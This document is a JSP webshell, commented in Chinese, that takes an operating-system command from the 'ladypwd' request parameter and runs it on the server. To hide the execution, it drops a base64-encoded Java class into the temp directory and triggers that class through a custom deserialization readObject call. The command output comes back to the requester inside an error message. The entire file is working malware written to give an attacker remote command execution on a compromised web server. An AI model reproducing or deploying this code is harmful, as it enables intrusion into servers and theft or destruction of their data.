<%@ page import="java.util.Base64" %>
<%@ page import="java.io.*" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
重写ObjectInputStream.resolveClass()实现反序列化readObject触发的JSP Webshell
--%>
<%
    class Custom extends ObjectInputStream {
        public Custom(InputStream in) throws IOException {
            super(in);
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc)
                throws IOException, ClassNotFoundException {
            String name = desc.getName();
            String tmp = System.getProperty("java.io.tmpdir");
            Files.write(Paths.get(tmp + File.separator + "CMD"), request.getParameter("ladypwd").getBytes());
            Files.write(Paths.get(tmp + File.separator + "Demo4.class"), Base64.getDecoder().decode("yv66vgAAADQAoAoAJgBBBwBCCgACAEEIAEMKAEQARQcARgoAAgBHCQBIAEkIAEoKAAIASwoATABNCgBOAE8KAAYAUAoAUQBSCgBRAFMKAFQAVQcAVgcAVwoAEgBYCgARAFkKABEAWggAWwcAXAoAFwBdCgAXAF4HAF8KABoAQQcAYAoAHABhBwBiCgAeAEEKABwAYwkARABkCgBlAGYKABoAZwoAaABpCgBqAGsHAGwHAG0BABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFAAAAAAAAAAEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKcmVhZE9iamVjdAEAHihMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTspVgEADVN0YWNrTWFwVGFibGUHAGIHAG4HAEIHAEYHAG8HAFYHAFwBAApFeGNlcHRpb25zAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHAHABAApTb3VyY2VGaWxlAQAKRGVtbzQuamF2YQwALQAuAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAA5qYXZhLmlvLnRtcGRpcgcAcQwAcgBzAQAQamF2YS9sYW5nL1N0cmluZwwAdAB1BwB2DAB3AHgBAANDTUQMAHkAegcAewwAfAB9BwB+DAB/AIAMAC0AgQcAggwAgwCEDACFAIYHAIcMAIgAiQEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAtAIoMAC0AiwwAjAB6AQABCgEAE2phdmEvbGFuZy9UaHJvd2FibGUMAI0ALgwALQCOAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BABpqYXZhL2lvL09iamVjdE91dHB1dFN0cmVhbQwALQCPAQAFRGVtbzQMAJAAkQwAkgCTBwCUDACVAJgMAJkAmgcAmwwAnACdBwCeDACfAI4BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBABlqYXZhL2lvL09iamVjdElucHV0U3RyZWFtAQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsBABNqYXZhL25pby9maWxlL0ZpbGVzAQAMcmVhZEFsbEJ5dGVzAQAYKExqYXZhL25pby9maWxlL1BhdGg7KVtCAQAFKFtCKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAPcHJpbnRTdGFja1RyYWNlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAC3dyaXRlT2JqZWN0AQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAC3RvQnl0ZUFycmF5AQAEKClbQgEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuACEAHgAmAAEAJwABABoAKAApAAEAKgAAAAIAKwADAAEALQAuAAEALwAAAB0AAQABAAAABSq3AAGxAAAAAQAwAAAABgABAAAACQACADEAMgACAC8AAAEIAAUACAAAAIe7AAJZtwADTRIEuAAFTrsABlm7AAJZtwADLbYAB7IACLYABxIJtgAHtgAKA70ABrgAC7gADLcADToEuAAOGQS2AA+2ABA6BbsAEVm7ABJZGQW3ABO3ABQ6BhkGtgAVWToHxgASLBkHtgAHEha2AAdXp//ppwAITi22ABi7ABdZLLYACrcAGb8AAQAIAHMAdgAXAAIAMAAAAC4ACwAAAA0ACAAPAA4AEAA6ABEARwASAFkAFABkABUAcwAZAHYAFwB3ABgAewAaADMAAAAzAAT/AFkABwcANAcANQcANgcANwcANwcAOAcAOQAA/wAZAAMHADQHADUHADYAAEIHADoEADsAAAAEAAEAFwAJADwAPQACAC8AAABPAAMAAgAAACu7ABpZtwAbTLsAHFkrtwAduwAeWbcAH7YAILIAIbgAIiu2ACO2ACS2ACWxAAAAAQAwAAAAEgAEAAAAHgAIAB8AGgAgACoAIQA7AAAABAABAD4AAgA/AAAAAgBAAJcAAAAKAAEAaABlAJYACQ=="));
            //这里return的Class会被反序列化成对应的Object
            return Class.forName(name, false, new URLClassLoader(new URL[]{new URL("file:" + tmp + File.separator)}));
        }
    }
    try {
        new Custom(new ByteArrayInputStream(Base64.getDecoder().decode("rO0ABXNyAAVEZW1vNAAAAAAAAAABAgAAeHA="))).readObject();
    } catch (Exception e) {
        out.print("<pre>");
        out.print(e.getCause().getMessage());
        out.print("</pre>");
    }
%>
